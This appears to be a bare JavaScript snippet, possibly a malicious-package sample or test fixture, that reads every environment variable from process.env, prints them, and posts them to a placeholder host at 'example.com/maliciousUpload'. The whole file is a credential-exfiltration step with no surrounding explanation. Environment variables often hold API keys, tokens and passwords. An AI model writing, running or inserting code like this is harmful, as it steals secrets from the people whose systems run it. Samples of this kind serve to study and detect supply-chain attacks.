const env = process.env
console.log('Env:', env)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post',
    body: { env }
  }
)
